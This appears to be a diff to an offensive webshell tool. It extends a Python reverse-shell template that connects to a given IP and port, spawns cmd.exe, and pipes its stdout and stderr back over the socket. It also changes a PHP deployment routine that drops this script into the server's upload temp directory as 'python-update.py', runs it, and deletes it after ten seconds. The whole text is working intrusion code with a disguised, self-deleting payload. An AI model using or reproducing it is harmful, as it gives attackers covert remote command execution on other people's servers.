@@ -95,11 +95,18 @@ def send(client, proc):
     while True:
         msg = proc.stdout.readline()
         client.send(msg)
+def send2(client, proc):
+    while True:
+        msg = proc.stderr.readline()
+        client.send(msg)
 client = socket(AF_INET, SOCK_STREAM)
 addr = ('%s', %s)
 client.connect(addr)
 proc = subprocess.Popen('cmd.exe /K',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
 t = threading.Thread(target=send, args=(client, proc))
+t.setDaemon(True)
+t.start()
+t = threading.Thread(target=send2, args=(client, proc))
 t.setDaemon(True)
 t.start()
 while True:
@@ -136,17 +143,18 @@ def run(ip: str, port: str, reverse_type: str = "php"):
         if flag:
             python = get_reverse_python(ip, port)
             if is_windows():
+                pyname = "python-update.py"
                 text = send(
-                    f"print(file_put_contents('cof.py', \"{python}\"));"
+                    f"print(file_put_contents(ini_get('upload_tmp_dir').'\\\\{pyname}', \"{python}\"));"
                 ).r_text.strip()
                 if not len(text):
                     print(color.red("Failed to write file in current directory."))
                     return
-                t = Thread(target=send, args=(f"system('python cof.py');",))
+                t = Thread(target=send, args=(f"system('python '.ini_get('upload_tmp_dir').'\\\\{pyname}');",))
                 t.setDaemon(True)
                 t.start()
                 t2 = Thread(
-                    target=delay_send, args=(10.0, f"unlink('cof.py');",)
+                    target=delay_send, args=(10.0, f"unlink(ini_get('upload_tmp_dir').'\\{pyname}');",)
                 )
                 t2.setDaemon(True)
                 t2.start()
